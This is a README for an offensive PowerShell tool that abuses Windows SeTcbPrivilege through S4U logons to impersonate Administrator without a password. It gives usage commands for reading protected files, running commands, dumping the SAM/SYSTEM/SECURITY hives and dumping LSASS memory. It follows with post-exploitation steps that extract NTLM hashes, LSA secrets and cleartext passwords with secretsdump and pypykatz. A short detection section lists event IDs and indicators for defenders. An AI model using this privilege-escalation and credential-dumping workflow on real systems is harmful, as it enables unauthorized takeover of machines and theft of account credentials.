# SeTcbPrivilege-Escalation

Exploit **SeTcbPrivilege** to impersonate any local user without password via S4U (`LsaLogonUser` with `MSV1_0_S4U_LOGON`). Read files, list directories, execute commands, dump registry hives, and dump LSASS — all as Administrator. PowerShell + inline C# — no compilation needed.

## How it works

When a Windows service account has `SeTcbPrivilege` ("Act as part of the operating system") enabled, it can call `LsaRegisterLogonProcess` and perform an S4U (Service for User) logon via `LsaLogonUser` with `MSV1_0_S4U_LOGON` (type 12). This creates an impersonation token for any local user — **without knowing their password**.

The script:
1. Enables `SeTcbPrivilege` via `RtlAdjustPrivilege`
2. Registers a logon process with `LsaRegisterLogonProcess`
3. Performs an S4U logon with `LsaLogonUser` (MSV1_0 package, type 12)
4. Calls `ImpersonateLoggedOnUser` to assume the target user's identity
5. Performs the requested action (read, dir, exec, savehives, dumplsass) in that context

## Requirements

- A shell as a user with **SeTcbPrivilege** (check with `whoami /priv`)
- PowerShell with `Add-Type` support (default on Windows Server 2012+)
- No admin rights needed — SeTcbPrivilege is sufficient

## Usage

Transfer `s4u_run.ps1` to the target, then:

```powershell
# Read a file as Administrator
powershell -ep bypass -File s4u_run.ps1 -Action read -Target "C:\Users\Administrator\Desktop\flag.txt"

# List a directory as Administrator
powershell -ep bypass -File s4u_run.ps1 -Action dir -Target "C:\Users\Administrator\Desktop"

# Execute a command as Administrator
powershell -ep bypass -File s4u_run.ps1 -Action exec -Target "net user Administrator"

# Read a binary file as base64
powershell -ep bypass -File s4u_run.ps1 -Action readb64 -Target "C:\Users\Administrator\Documents\secret.zip"

# Dump SAM, SYSTEM, SECURITY registry hives
powershell -ep bypass -File s4u_run.ps1 -Action savehives

# Dump LSASS process memory
powershell -ep bypass -File s4u_run.ps1 -Action dumplsass
```

### Actions

| Action | Description |
|--------|-------------|
| `read` | Read a file as the impersonated user |
| `dir` | List a directory as the impersonated user |
| `exec` | Execute a command via `cmd /c` |
| `readb64` | Read a binary file and output as base64 |
| `savehives` | Dump SAM + SYSTEM + SECURITY via `RegSaveKey` (requires `SeBackupPrivilege` on the impersonated user) |
| `dumplsass` | Dump LSASS via `MiniDumpWriteDump` (enables `SeDebugPrivilege` on the process token) |

### Parameters

| Parameter | Required | Default | Description |
|-----------|----------|---------|-------------|
| `-Action` | Yes | — | `read`, `dir`, `exec`, `readb64`, `savehives`, or `dumplsass` |
| `-Target` | Yes* | — | File path, directory path, or command (*not needed for `savehives`/`dumplsass`) |
| `-User` | No | `Administrator` | User to impersonate |
| `-Domain` | No | `SRV01` | Machine/domain name |
| `-OutDir` | No | `C:\Liferay` | Output directory for `savehives` and `dumplsass` |

### Impersonate a different user

```powershell
powershell -ep bypass -File s4u_run.ps1 -Action read -User "svc_backup" -Domain "DC01" -Target "C:\secrets.txt"
```

## Example output

```
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                         State
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled

PS C:\> powershell -ep bypass -File s4u_run.ps1 -Action read -Target "C:\Users\Administrator\Desktop\flag.txt"
4832d0bd7c24d6e62b6a2afc75392645

PS C:\> powershell -ep bypass -File s4u_run.ps1 -Action dir -Target "C:\Users\Administrator\Desktop"
C:\Users\Administrator\Desktop\desktop.ini
C:\Users\Administrator\Desktop\flag.txt

PS C:\> powershell -ep bypass -File s4u_run.ps1 -Action savehives -OutDir "C:\Temp"
SAM: OK
SYSTEM: OK
SECURITY: OK
```

## Post-exploitation: extracting hashes

After dumping the hives with `savehives`, transfer them to your attack machine and run:

```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

This extracts:
- **SAM** — local NTLM hashes (Administrator, local users)
- **SECURITY** — LSA secrets (service account passwords, cached domain credentials DCC2)

After dumping LSASS with `dumplsass`, use:

```bash
pypykatz lsa minidump lsass.dmp
```

This extracts:
- Active logon sessions (NTLM hashes, Kerberos tickets)
- Cleartext passwords (if WDigest is enabled)

## Note on `exec` action

The `exec` action spawns `cmd.exe /c <command>` under the impersonated thread. However, child processes inherit the **process token**, not the thread impersonation token. This means `whoami` will show the original user, not the impersonated one. File operations (`read`, `dir`, `readb64`, `savehives`) work correctly because they run directly in the impersonated thread context.

## Detection

- Event ID **4624** with Logon Type **12** (S4U / NewCredentials) and package `MICROSOFT_AUTHENTICATION_PACKAGE_V1_0`
- Process name registered via `LsaRegisterLogonProcess` (default: `JavaSvc`)
- `Add-Type` usage with P/Invoke signatures for `secur32.dll` / `ntdll.dll`
- `MiniDumpWriteDump` call from a non-standard process (for `dumplsass`)

## References

- [Microsoft — LsaLogonUser function](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser)
- [Microsoft — MSV1_0_S4U_LOGON structure](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-msv1_0_s4u_logon)
- [Microsoft — SeTcbPrivilege](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system)

## License

[MIT](LICENSE)
